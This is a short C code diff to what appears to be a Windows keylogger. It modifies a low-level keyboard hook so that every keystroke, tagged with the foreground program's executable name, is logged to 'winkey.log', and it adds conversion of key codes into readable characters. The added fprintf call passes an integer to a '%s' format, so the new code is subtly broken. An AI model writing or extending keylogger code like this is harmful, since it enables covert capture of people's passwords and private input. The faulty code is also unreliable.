@@ -2,8 +2,6 @@
 
 HHOOK g_ouk;
 
-
-
 void *which_open(char *exe)
 {
 	HWND ptr_stuct = GetForegroundWindow();
@@ -21,14 +19,19 @@ void *which_open(char *exe)
 LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 {
 	char exe[MAX_PATH] = {0};
+	char key[8] = {0};
 	if (ncode == HC_ACTION && wp == WM_KEYDOWN)
 	{
 		KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lp;
+		int new_key = vk_to_char(kbd->vkCode, key);
 		which_open(exe);
 		FILE *f = fopen("winkey.log", "a");
 		if (f)
 		{
-			fprintf(f, "[%s] key: %lu\n", exe, kbd->vkCode);
+			if (new_key)
+				fprintf(f, "[%s] key: '%s'\n", exe, new_key);
+			else
+				fprintf(f, "[%s] key: VK(%lu)\n", exe, kbd->vkCode);
 			fclose(f);
 		}
 	}
